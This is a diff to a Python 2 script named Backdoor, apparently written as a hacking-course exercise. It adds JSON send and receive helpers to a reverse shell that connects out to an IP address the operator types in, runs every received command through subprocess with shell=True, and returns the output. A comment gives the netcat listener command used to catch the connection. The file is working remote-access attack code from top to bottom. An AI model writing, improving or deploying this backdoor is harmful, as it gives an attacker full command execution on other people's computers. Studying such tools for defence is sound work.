@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #needs debugging to work in python3 - bytes-like object error
 
-import socket, subprocess
+import json, socket, subprocess
 
 #to open listening connection on target computer using netcat:
 #nc -vv -l -p 4444
@@ -15,12 +15,24 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
     
+    def reliable_receive(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
+    
+    def reliable_send(self, data):
+        #seralise data being sent in order to make sure
+        #data arrives intact and pipe doesn't break
+        json_data = json.dumps(data) #dumps - method to convert to json object
+        self.connection.send(json_data)
+    
     def run(self):
         while True:
-            command = self.connection.recv(1024) #receive, specify buffer size
+            #command = self.connection.recv(1024) #receive, specify buffer size
+            command = self.reliable_receive() #receive, specify buffer size
             command_result = self.execute_system_command(command) #specify SELF.function -
             #need to specify self since calling function from within class
-            self.connection.send(command_result)
+            #self.connection.send(command_result)
+            self.reliable_send(command_result)
         connection.close()
     
 ip = raw_input("Enter IP Address: ")
